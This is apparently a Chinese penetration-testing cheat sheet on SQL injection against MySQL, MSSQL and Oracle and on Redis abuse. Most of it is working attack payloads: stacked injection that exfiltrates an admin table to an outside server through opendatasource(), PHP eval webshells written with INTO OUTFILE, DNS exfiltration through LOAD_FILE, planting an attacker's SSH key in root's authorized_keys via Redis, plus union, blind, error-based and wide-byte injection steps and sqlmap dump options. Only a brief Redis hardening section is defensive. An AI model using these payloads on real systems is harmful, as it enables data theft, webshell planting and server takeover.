# http header sql注入
## 常用注入header
- User-Agent
- Referer
- Host
- X-Forwarded
- X-Forwarded-For
- Forwarded
- Forwarded-For
- Cookie

# mssql反弹注入

> 使用mssql独有的函数opendatasource()将查询结果插入到自己的公网数据库；

## mssql opendatasource()函数用法

```sql
opendatasource('sqloledb','server=公网地址,端口;uid=用户名;pwd=密码;database=库名')
```
该函数作用是打开远程数据源连接

## mssql获取表名

```
select id,name from sysobjects where xtype='U' -- xtype U是用户表 S是系统表
```
### sysobjects.xtype值的含义
> C = CHECK 约束  
D = 默认值或 DEFAULT 约束  
F = FOREIGN KEY 约束  
L = 日志  
FN = 标量函数  
IF = 内嵌表函数  
P = 存储过程  
PK = PRIMARY KEY 约束（类型是 K）  
RF = 复制筛选存储过程  
S = 系统表  
TF = 表函数  
TR = 触发器  
U = 用户表  
UQ = UNIQUE 约束（类型是 K）  
V = 视图  
X = 扩展存储过程

## mssql获取字段名
```
select * from syscolumns where id=581577110 -- (表的id)
```

## 堆叠注入执行insert语句

```sql
https://api.xxx.com/getUserInfo?id=1;insert into opendatasource('sqloledb','server=123.123.123.123,1433;uid=test;pwd=123456;database=db1').db1.dbo.table1 (col1,col2) select col1,col2 from admin;
```


# mysql写文件

## 任意路径(outfile和dumpfile可用的情况下)

`select into` + 

- `outfile`可以写入多行，可输出终止符和换行格式，常用与脱库

- `dumpfile`只可写一行，并且输出中不存在任何格式，导入二进制文件不会因换行符导致文件被破坏，所以常用于写入软件 _udf提权_

### demo

```
  select "<?php eval($_REQUEST[8])?>" into outfile '../../../../php/a.php";
```

- `select 123 into outfile './1.txt'`

## 固定路径(低权限时方案)

> 利用mysql建表插入数据权限写入一句话木马，前提是等登录...爆破不出密码就尝试找其他文件上传漏洞吧

> 以下命令在mysql命令行环境中执行

### 查询数据库数据存储路径

```
select @@datadir
```

结果如：`D:\MySQL\data\`

### 选择数据库

- 查看数据库列表`select databases;`
- 选中有权限的数据库`use 数据库名`

### 创建表，将一句话木马作为字段名写入

```sql
create table if not exists `t`(`a` varchar(255) not null)engine=csv;
insert into t value('<?php eval($GET[8]);?>')
```

最后需要找到可控的引入点，将`D:\MySQL\data\数据库名\t.CSV`引入

绝对路径行不通的话可以尝试下相对路径`asdjfasdasdf/../../../../../../../../MySQL/data/数据库名/t.CSV`

# mysql盲注数据外带
## dns注入

### 前提条件
- windows系统下，且smb可用
- 安装了smb服务的linux(概率很小)
- mysql配置项`secure_file_priv`留空


### mysql配置项`secure_file_priv`简介
- `secure_file_priv`值为null时，mysqld不允许导入导出
- `secure_file_priv`值为空时，mysqld导入导出无限制
- `secure_file_priv`值为`/data/`时，mysqld导入导出路径只能为`/data/`
- 可执行`show global variables like '%secure%'`查看配置


### mysql读取文件

```
select load_file(filepath);
```

`filepath`可以输入:
- 相对路径`./filepath`
- 全局路径`C:/filepath`
- 网络共享路径`//filepath`

### dns日志

开源项目：https://github.com/BugScanTeam/DNSLog

在线工具：http://www.dnslog.cn

### demo

- 数据外带
  ```
  SELECT LOAD_FILE(CONCAT('//'.DATABASE(),'.xxx.xxx.com'));
  ```

## 写入脚本文件漏洞利用

### mysql写文件`select into`

- `outfile`可以写入多行，可输出终止符和换行格式，常用与脱库

- `dumpfile`只可写一行，并且输出中不存在任何格式，导入二进制文件不会因换行符导致文件被破坏，所以常用于写入软件 _udf提权_

### demo


- `select 123 into outfile './1.txt'`


- 写入一句话木马

  ```
  select "<?php eval($_REQUEST[8])?>" into outfile '../../../../php/a.php";
  ```



# redis获取ssh免密码登录权限

> 前提：redis是以root权限运行
> 
> 无root权限也可以尝试往常用网站目录写入一句话木马

## 利用
- 建立tcp连接

  `nc`可用`telnet`or`netcat`替代

```bash
nc 127.0.0.1 port
```

- 弱口令情况下(未授权不用)

```
auth 密码
```

- 设置写入路径与文件名称

```
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
```

- 找一个不在使用的数据库，不对目标数据造成影响

  redis数据库取值范围：0-15

```
select 15
```
执行`keys *`，出现`*0`则代表里面没有数据，`flushall`可清空数据库所有数据


- 将自己的公钥`~/.ssh/id_rsa.pub`配置到目标服务器

  命令格式：set 【键】【值】

```
set "abc" "ssh-rsa AAAAB3NzaC1y........"
```

- 持久化保存

```
save
exit
```

- 尝试登录目标服务器

```
ssh root@121.198.1.2 -p22
```

## 修复方法
- 设置复杂密码
- 修改redis.conf,只对内网服务,或修改默认端口
```redis.conf
bind 127.0.0.1
Port 19898
```
- 修改redis.conf, 重命名高危命令

```redis.conf
rename-command EVAL ""
rename-command CONFIG ""
rename-command FLUSHALL ""
```

重启redis

- 低权限运行

```bash
groupadd -r redis && useradd -r -g redis redis
```



# sqlmap

[官网地址: https://sqlmap.org/](https://sqlmap.org/)

[仓库地址: https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

[使用手册(英文): https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

## 常用参数
- `-m` 扫码文件里所有url

```
www.target1.com/vuln1.php?q=foobar
www.target2.com/vuln2.asp?id=1
www.target3.com/vuln3/id/1*
```

- `-r` 从文件加载http请求

```
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0
id=1
```

- `-c` 从配置文件加载flag
- `--proxy` 使用http代理
- `--proxy-file` 使用文件里的http代理(失败自动跳下一个)
- `--delay` 每个请求间延迟(秒),默认0
- `--timeout` 连接超时等待(秒),默认30
- `--retries` 连接重试次数,默认3
- `--safe-url` 测试时经常访问的安全url(假装在正常使用业务)
- `--safe-req` 从文件加载使用安全url
- `--safe-post` 给上述连接发送post数据
- `--safe-freq` 每次测试请求后再访问一次安全连接
- `--level` 测试级别【1-5】，默认1
- `--fisk` 风险级别【1-3】，默认1，3级可能会导致数据被更新
- `--dump-all` 脱库
- `--exclude-sysdbs` 脱库时排除系统数据库


# 三大数据库常用特性对比

## 获取表名

### mysql

```sql
select * from information_schema.tables where table_schema=database()
```

### mssql

```sql
select id,name from sysobjects where xtype='U' -- xtype U是用户表 S是系统表
```

### oracle

所有表
```sql
select * from all_tables
```
该用户创建的所有表
```
select * from user_tables
```

## 获取字段名
### mysql

```sql
select * from information_schema.columns 
where table_schema=database() 
and table_name='表名'
```
### mssql

```sql
select name from syscolumns where id=581577110 -- (表的id)
```
### oracle

```sql
select * from all_tab_columns

```

```sql
select * from user_tab_columns where table_name='tb1'
```

## 获取数据库版本

### mysql

```sql
select version()
```

### mssql

```sql
select @@version
```

### oracle
```sql
select * from v$version
```

## 分页查询
 
### mysql
```sql
select * from tb1 limit 【(页码-1)*长度】,【长度】
```

### mssql
```sql
select * from (select *, ROW_NUMBER() OVER(Order by xxid ) AS rowId  from tb1) as b
where rowId between 【(页码-1)*长度】 and 【长度*页码】
```

2012版本以下
```sql
select top 【长度】 * 
from (select top 【长度*页码】 * from user_table order by id asc ) 
as asystable order by id desc
```

2012版本以上
```sql
select * from tb1  order by xxid offset 【页码】 rows fetch next 【长度】 rows only
```

### oracle

```sql
select * from (select *,rownum n from tb1 order by active_count desc) where n > 10 and n<=20 
```

## 最短查询语句
### mysql
```sql
select 1
```
### mssql
```sql
select 1
```
### oracle
```sql
select 1 from dual -- dual虚表用来满足oracle严格的语法
```

## 默认端口
### mysql
3306
### mssql
1433
### oracle
1521

# 三大数据库报错注入(未完成)

## mysql
### 函数
```sql

```
## mssql
## oracle
### 函数
```sql
CTXSYS.DRITHSX.SN(user,(select col1 from tb1 where rownum=1))
```
### 利用
```sql
https://api.xxx.com/news?id=1' 
where 1=CTXSYS.DRITHSX.SN(123456,(select table_name from user_tables where rownum=1))
-- a
```

# sql注入漏洞
> demo: xxx.com/goods/info?&id=1
>
> > 猜测 sql 语句: `select id,name from xx where id=1`
## union联合查询
### check leak 
- 测试数据类型强转: 若 `where id=1 and 1=2` 被强转为 `where id=1`，则数据类型为无引号的int
- 计算结果是否影响查询: `where id=1+1`
- 延时注入: `where id=1 and sleep(10)`
- 布尔注入: `where id=1 && '-1' like '-1'` 
- 测试flag数: `order by 2` 或 `union select null,null`//select尽量用null去匹配,除了mysql，其他数据库要求`union select`字段类型一一对应
> 测试mssql尽量使用`union all`，因为`union`会排除重复的值
### 利用注入点


#### step1: 获取所有表名
```sql
where id=1 
union select 1,table_name 
from information_schema.tables 
where table_schema=database() 
limit 1 offset 1
```

#### step2: 获取字段名
```sql
where id=1 
union select 1,column_name 
from information.columns 
where table_schema=database() 
&& table_name="yourTableName"
limit 1,1 #query one by one or use group_concat(column_name)
```

#### step3: 获取任意数据

__example__
```
where id=1 
union select 1,mobile
from user
limit 1,1
```
## xparh显错注入 & http header 注入

```text
/**
 * 从目标xml搜索字符串
 * @param XML_document
 * @param xpath_string
 */
extractvalue(XML_document，xpath_string);

/**
 * 替换xml匹配节点的值
 * @param XML_document
 * @param xpath_string
 * @param new_value
 */
updatexml(XML_document，XPath_string，new_value);
```

__demo sql__
```php
$sql = "insert into login_log (ua,uid) values ('$ua',$uid)"
```

__user-agent__
- `1',updatexml(1,concat(0x7e,(select 123 limit 1)),1)) -- a`
- `1',extractvalue(1,concat(0x7e,(select 123 limit 1)))) -- a`

# 判断数据库类型

### mssql
```
and exists (select * from sysobjects)
and exists (select count(*) from sysobjects)`
```
返回true则为mssql

### mysql

```
select 1,2,3 limit 0,2
```
可正常返回则为mysql

### oracle

# 堆叠注入

用`;`结束语句以执行另一条语句

## 测试注入点
demo: `https://api.xxx.com/news/info?title=xxx`


测试后一条语句能否对请求结果造成影响
```
https://api.xxx.com/news/info?title=xxx';select 1 from abcde -- a
```

```
https://api.xxx.com/news/info?title=xxx';select a from abcde -- a
```



# 宽字节注入
## 介绍

该漏洞对使用本地化编码(即非utf8)的数据库有效

> gbk: 1个中文占2字节；1个英文占1字节
>
> utf8: 1个中文占3字节；1个英文占1字节

遇到使用gbk编码的数据库时，可拼接字节使英文字符形成汉字达到逃逸符号目的。

### 资源

__[gbk编码表](https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php)__

## hex拼接（前端为gbk或utf-8）
### demo
```php
$name = $_REQUEST['name'];
$sql = "select * from user where name='$name' and status=1";
// 引号自动转义（前面加\)
$newSql = addcslashes($sql);
return $newSql;
```

### 引号逃逸测试1
```
url/?&name=a' or 1=1 -- 000
```

输出结果：
```
select * from user where name='a\' or 1=1 -- 000' and status=1
```
反斜杠转义了引号，逃逸失败


### 引号逃逸测试2
反斜杠\的hex为`5c`，我们在反斜杠前面随便添加一个hex格式的字节`ff`，组成`ff5c`,代表汉字`峿`。

f的hex为`66`，为防止ff被url编码转成`%66%66`，我们需要在传url参数时为ff添加一个`%`。

如：
```
url/?&name=a%ff' or 1=1 -- 000
```

输出结果：
```
select * from user where name='a峿' or 1=1 -- 000' and status=1
```



## 更方便当方法-汉字拼接
当前端编码为utf-8，数据库编码为gbk时，可以更方便地转义`\`进行干扰;

前端直接传入utf8汉字拼，如`好`字, hex为`e5a5bd`;

`e5a5bd`与`\`符号`5c`拼接后，数据库gbk编码会将其拆分为`e5a5`和`bd5c`，字符`å¥岽`;

-----

__tip:__
1. 网页默认编码为gbk，数据库编码大概率也是gbk。
2. 使用hex拼接，若传参方式不是url，则需要抓包修改数据包。

# 盲注
{docsify-updated}
## 定义
查询内容无回显的情况下，根据布尔值盲猜ascii码

>例如：注册账号时，查询邮箱是否已被注册
>
> ```sql
> select * from user where email='1@1.com'
> ```
> 显示：该邮箱可以使用

## 获取注入点


### 检验布尔注入

 ```
 select * from user where email='1@1.com' or 1=1 limit 1 -- a'
 ```
> 成功则显示：该邮箱已被注册

 ```
 select * from user where email='1@1.com' or 1=2 limit 1 -- a'
 ```

> 成功则显示：该邮箱可以使用

### 检验延迟注入

 ```
 select * from user where email='1@1.com' or sleep(10) -- a'
 ```
> 成功则显示：该邮箱可以使用

## 利用注入点
### 爆破库名
#### step1: 爆破库名长度
 ```
 select * from user where email='1@1.com' 
 or length(database())>5 limit 1 -- a'
 ```
> 输出:该邮箱可以使用 //false,库名长度小于等于5

 ```
 select * from user where email='1@1.com' 
 or length(database())=4 limit 1 -- a'
 ```
> 输出:该邮箱已被注册 //true,库名长度为4


#### step2: ascii码爆破库名
 ```
 select * from user where email='1@1.com' or ascii(SUBSTR(database(),1,1))=117 limit 1 -- a'
 ```
> 第1位为：u

 ```
 select * from user where email='1@1.com' or ascii(SUBSTR(database(),2,1))=115 limit 1 -- a'
 ```
> 第2位为：s

 ```
 select * from user where email='1@1.com' or ascii(SUBSTR(database(),3,1))=101 limit 1 -- a'
 ```
> 第3位为：e

 ```
 select * from user where email='1@1.com' or ascii(SUBSTR(database(),4,1))=114 limit 1 -- a'
 ```
> 第4位为：r

### 爆破表名
思路和库名差不多，略微繁琐，了解一种以应万变即可，实战用sqlmap跑表名与字段。

